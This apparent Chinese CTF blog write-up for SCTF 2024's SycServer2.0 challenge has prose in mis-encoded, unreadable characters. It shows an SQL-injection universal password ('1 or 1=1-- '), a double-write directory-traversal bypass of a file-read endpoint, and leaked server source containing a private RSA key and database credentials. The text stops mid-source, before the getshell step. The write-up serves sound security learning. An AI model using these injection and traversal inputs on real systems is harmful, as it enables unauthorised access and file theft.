      <link href="/2024/10/05/cong-2024sctf-sysclover2-xue-xi-yuan-xing-lian-wu-ran-huan-jing-bian-liang-getshell/"/>
      <url>/2024/10/05/cong-2024sctf-sysclover2-xue-xi-yuan-xing-lian-wu-ran-huan-jing-bian-liang-getshell/</url>
      
        <content type="html"><![CDATA[<p>è§‰å¾—è‡ªå·±ç‰›é€¼äº†ï¼Ÿæ‰“ä¸ªæ¯”èµ›ä½ å°±è€å®äº†</p><h2 id="SCTF-SycServer2-0åŸå‹é“¾æ±¡æŸ“"><a href="#SCTF-SycServer2-0åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="SCTF SycServer2.0åŸå‹é“¾æ±¡æŸ“"></a>SCTF SycServer2.0åŸå‹é“¾æ±¡æŸ“</h2><p>&#x2F;robots.txt</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">User</span>-<span class="attr">agent</span>: *</span><br><span class="line"><span class="title class_">Disallow</span>:</span><br><span class="line"><span class="title class_">Disallow</span>: /<span class="title class_">ExP0</span>rtApi?v=<span class="keyword">static</span>&amp;f=<span class="number">1.</span>jpeg</span><br></pre></td></tr></table></figure><p>configä¸‹æœ‰å…¬é’¥æ–‡ä»¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----<span class="variable constant_">BEGIN</span> <span class="variable constant_">PUBLIC</span> <span class="variable constant_">KEY</span>-----</span><br><span class="line"><span class="title class_">MIGfMA</span>0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B<span class="comment">//vLQ</span></span><br><span class="line"><span class="title class_">TfCUTc</span>+<span class="title class_">AOwpNdBsOyoRcupuBmh8XSVnm</span>5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC</span><br><span class="line"><span class="title class_">XmWF4LwUIUfk4</span>/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe</span><br><span class="line">I+<span class="title class_">Atul1</span>rSE0APhHoPwIDAQAB</span><br><span class="line">-----<span class="variable constant_">END</span> <span class="variable constant_">PUBLIC</span> <span class="variable constant_">KEY</span>-----</span><br></pre></td></tr></table></figure><p>é¦–é¡µæœ‰ç™»å½•å¤„ç†javascriptï¼Œè¿‡æ»¤äº†ä¸€ä¸‹sqlï¼Œä¸è¿‡æ²¡è¿‡æ»¤ç©ºæ ¼ï¼Œ<code>1 or 1=1-- </code>ä¸‡èƒ½å¯†ç ï¼Œç”¨ä¸Šé¢çš„å…¬é’¥rsaç›´æ¥ç™»å½•</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">wafsql</span>(<span class="params">str</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> str.<span class="title function_">replace</span>(<span class="regexp">/[\-\_\,\!\|\~\`\(\)\#\$\%\^\&amp;\*\&#123;\&#125;\:\;\&quot;\&lt;\&gt;\?\\\/\&#x27;\ ]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">name</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> value = <span class="string">`; <span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span>;</span><br><span class="line">        <span class="keyword">const</span> parts = value.<span class="title function_">split</span>(<span class="string">`; <span class="subst">$&#123;name&#125;</span>=`</span>);</span><br><span class="line">        <span class="keyword">if</span> (parts.<span class="property">length</span> === <span class="number">2</span>) <span class="keyword">return</span> parts.<span class="title function_">pop</span>().<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>).<span class="title function_">shift</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> authToken = <span class="title function_">getCookie</span>(<span class="string">&#x27;auth_token&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (authToken) &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;/hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;loginForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">      e.<span class="title function_">preventDefault</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> username = <span class="title function_">wafsql</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).<span class="property">value</span>);</span><br><span class="line">      <span class="keyword">const</span> password = <span class="title function_">wafsql</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).<span class="property">value</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/config&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> &#123; publicKey &#125; = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> encrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>();</span><br><span class="line">      encrypt.<span class="title function_">setPublicKey</span>(publicKey);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> encryptedPassword = encrypt.<span class="title function_">encrypt</span>(password);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> formData = &#123;</span><br><span class="line">        <span class="attr">username</span>: username,</span><br><span class="line">        <span class="attr">password</span>: encryptedPassword</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> loginResponse = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/login&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(formData),</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> result = <span class="keyword">await</span> loginResponse.<span class="title function_">json</span>();</span><br><span class="line">      <span class="keyword">if</span> (result.<span class="property">success</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>);</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;/hello&quot;</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;ç™»å½•å¤±è´¥ï¼š&#x27;</span> + result.<span class="property">message</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p><code>/ExP0rtApi?v=./&amp;f=app.js</code>æ¥å£å¯ä»¥è¯»æ–‡ä»¶ï¼Œvå‚æ•°åŒå†™ç»•è¿‡ç›®å½•ç©¿è¶Šï¼Œåˆ†åˆ«è¯»åˆ°app.jsï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> nodeRsa = <span class="built_in">require</span>(<span class="string">&#x27;node-rsa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> handle = <span class="built_in">require</span>(<span class="string">&#x27;./handle&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> con = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="attr">user</span>: <span class="string">&#x27;ctf&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&#x27;ctf123123&#x27;</span>,</span><br><span class="line">  <span class="attr">port</span>: <span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line">  <span class="attr">database</span>: <span class="string">&#x27;sctf&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">con.<span class="title function_">connect</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error connecting to MySQL:&#x27;</span>, err.<span class="property">message</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(con.<span class="title function_">connect</span>(), <span class="number">2000</span>); <span class="comment">// 2ç§’åé‡è¯•è¿æ¥</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connected to MySQL&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;response&#125; = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> req = <span class="built_in">require</span>(<span class="string">&quot;express/lib/request&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="keyword">new</span> <span class="title function_">nodeRsa</span>(&#123; <span class="attr">b</span>: <span class="number">1024</span> &#125;);</span><br><span class="line">key.<span class="title function_">setOptions</span>(&#123; <span class="attr">encryptionScheme</span>: <span class="string">&#x27;pkcs1&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> publicPem = <span class="string">`-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----`</span>;</span><br><span class="line"><span class="keyword">var</span> privatePem = <span class="string">`-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27</span></span><br><span class="line"><span class="string">PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l</span></span><br><span class="line"><span class="string">i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi</span></span><br><span class="line"><span class="string">6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI</span></span><br><span class="line"><span class="string">lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY</span></span><br><span class="line"><span class="string">Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61</span></span><br><span class="line"><span class="string">khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT</span></span><br><span class="line"><span class="string">6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78</span></span><br><span class="line"><span class="string">dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG</span></span><br><span class="line"><span class="string">mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye</span></span><br><span class="line"><span class="string">KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh</span></span><br><span class="line"><span class="string">UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l</span></span><br><span class="line"><span class="string">zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg</span></span><br><span class="line"><span class="string">xu/vfQ0A1jHRNC7t</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Reportcache</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">verifyAdmin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> token = req.<span class="property">cookies</span>[<span class="string">&#x27;auth_token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;No token provided&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">SECRET_KEY</span>, <span class="function">(<span class="params">err, decoded</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Failed to authenticate token&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (decoded.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Access denied. Admins only.&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.<span class="property">user</span> = decoded;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/hello&#x27;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>)=&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;&lt;h1&gt;Welcome Admin!!!&lt;/h1&gt;&lt;br&gt;&lt;img src=&quot;./1.jpeg&quot; /&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/config&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123;</span><br><span class="line">    <span class="attr">publicKey</span>: publicPem,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> decrypt = <span class="keyword">function</span>(<span class="params">body</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> pem = privatePem;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="keyword">new</span> <span class="title function_">nodeRsa</span>(pem, &#123;</span><br><span class="line">      <span class="attr">encryptionScheme</span>: <span class="string">&#x27;pkcs1&#x27;</span>,</span><br><span class="line">      <span class="attr">b</span>: <span class="number">1024</span></span><br><span class="line">    &#125;);</span><br><span class="line">    key.<span class="title function_">setOptions</span>(&#123; <span class="attr">environment</span>: <span class="string">&quot;browser&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span> key.<span class="title function_">decrypt</span>(body, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;decrypt error&quot;</span>, e);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> encryptedPassword = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    passwd = <span class="title function_">decrypt</span>(encryptedPassword)</span><br><span class="line">    <span class="keyword">if</span>(username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> sql = <span class="string">`select (select password from user where username = &#x27;admin&#x27;) = &#x27;<span class="subst">$&#123;passwd&#125;</span>&#x27;;`</span></span><br><span class="line">      con.<span class="title function_">query</span>(sql, <span class="function">(<span class="params">err, rows</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(err.<span class="property">message</span>);</span><br><span class="line">        <span class="keyword">if</span> (rows[<span class="number">0</span>][<span class="title class_">Object</span>.<span class="title function_">keys</span>(rows[<span class="number">0</span>])]) &#123;</span><br><span class="line">          <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;username, <span class="attr">role</span>: username&#125;, <span class="variable constant_">SECRET_KEY</span>, &#123;<span class="attr">expiresIn</span>: <span class="string">&#x27;1h&#x27;</span>&#125;);</span><br><span class="line">          res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, token, &#123;<span class="attr">secure</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">          res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Login Successfully&#x27;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;Errow Password!&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;This Website Only Open for admin&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;Error decrypting password!&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/ExP0rtApi&#x27;</span>, verifyAdmin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> rootpath = req.<span class="property">query</span>.<span class="property">v</span>;</span><br><span class="line">  <span class="keyword">var</span> file = req.<span class="property">query</span>.<span class="property">f</span>;</span><br><span class="line"></span><br><span class="line">  file = file.<span class="title function_">replace</span>(<span class="regexp">/\.\.\//g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  rootpath = rootpath.<span class="title function_">replace</span>(<span class="regexp">/\.\.\//g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(rootpath === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(file === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;try to find parameters HaHa&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      rootpath = <span class="string">&quot;static&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, rootpath + <span class="string">&quot;/&quot;</span> + file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;File not found&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, fileData</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading file:&#x27;</span>, err);</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    zlib.<span class="title function_">gzip</span>(fileData, <span class="function">(<span class="params">err, compressedData</span>) =&gt;</span> &#123;</span><br><span class="line">      <span 